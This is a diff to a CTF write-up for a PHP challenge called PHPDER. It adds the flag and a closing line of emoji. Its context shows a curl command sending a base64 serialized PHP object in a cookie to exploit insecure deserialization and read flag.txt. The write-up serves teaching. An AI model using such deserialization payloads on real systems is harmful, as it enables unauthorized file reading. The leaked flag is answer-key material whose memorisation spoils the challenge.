@@ -1,5 +1,7 @@
 # PHPDER Writeup
 
+> Flag: FNW_CTF{pHp_0bj4ct_inj4ct10n_vu1n}
+
 At first glance it is a login page:
 
 ![image](https://user-images.githubusercontent.com/80664686/117576250-66aa6180-b10f-11eb-8036-3bdadc9e0a61.png)
@@ -68,3 +70,4 @@ Now we need to add the cookie and let it run the *print object* in `cookie.php`,
 $ curl http://chall4.ctf.night-wolf.io/authentication.php -b 'login="TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo4OiJmbGFnLnR4dCI7fQo="'
 Deserialization error. FNW_CTF{pHp_0bj4ct_inj4ct10n_vu1n}
 ```
+✨✨✨
